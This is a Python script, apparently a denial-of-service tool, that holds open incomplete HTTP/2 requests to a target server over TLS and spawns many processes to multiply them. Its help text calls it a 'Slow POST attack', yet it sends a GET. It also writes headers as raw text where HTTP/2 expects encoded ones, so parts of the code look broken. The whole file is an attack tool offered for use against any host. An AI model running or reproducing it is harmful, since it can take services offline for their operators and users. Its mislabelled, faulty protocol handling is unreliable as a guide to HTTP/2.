#!/usr/bin/python3
import socket
import ssl
import h2.connection
import h2.events
import argparse
import time
from multiprocessing import Process
from hyperframe.frame import HeadersFrame, SettingsFrame

def establish_tls_connection(host, port):
    try:
        context = ssl.create_default_context()
        context.set_alpn_protocols(['h2'])
        sock = socket.create_connection((host, port))
        tls_sock = context.wrap_socket(sock, server_hostname=host)
        return tls_sock
    except Exception as e:
        print(f"Error establishing TLS connection: {e}")
        exit(1)

def send_incomplete_header(tls_sock, target, path):
    try:
        conn = h2.connection.H2Connection()
        conn.initiate_connection()
        tls_sock.sendall(conn.data_to_send())

        headers = [
            (':method', 'GET'),
            (':authority', target),
            (':scheme', 'https'),
            (':path', path)
        ]

        stream_id = conn.get_next_available_stream_id()
        
        headers_frame = HeadersFrame(stream_id)
        headers_frame.flags = set()
        headers_frame.data = b''.join([f'{k}: {v}\r\n'.encode('utf-8') for k, v in headers])
        
        tls_sock.sendall(headers_frame.serialize())

        while True:
            data = tls_sock.recv(65535)
            if data:
                events = conn.receive_data(data)
                for event in events:
                    if isinstance(event, h2.events.StreamEnded):
                        print(f"Stream {event.stream_id} ended.")
                        return
                    elif isinstance(event, h2.events.ResponseReceived):
                        print(f"Server response received: {event.headers}")
                tls_sock.sendall(conn.data_to_send())
    except Exception as e:
        print(f"Error during the attack: {e}")
    finally:
        tls_sock.close()

def main():
    tls_sock = establish_tls_connection(args.target, args.port)
    
    send_incomplete_header(tls_sock, args.target, args.path)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Perform a Slow POST attack over HTTP/2.")
    parser.add_argument('-t', '--target', type=str, required=True, help="Target hostname or IP address.")
    parser.add_argument('-p', '--port', type=int, default=443, help="Target port (default: 443).")
    parser.add_argument('--path', type=str, default="/", help="Target path (default: '/').")
    parser.add_argument('-P', '--process', type=int, default=1, help="Number of processes to spawn (default: 1).")
    parser.add_argument('-d', '--delay', type=float, default=0.1, help="Delay between spawning processes in seconds (default: 0.1).")

    args = parser.parse_args()

    process_list = []

    for i in range(args.process):
        process = Process(target=main, daemon=True)
        process_list.append(process)
        process.start()

        time.sleep(args.delay)

    for process in process_list:
        if process.is_alive():
            process.join()
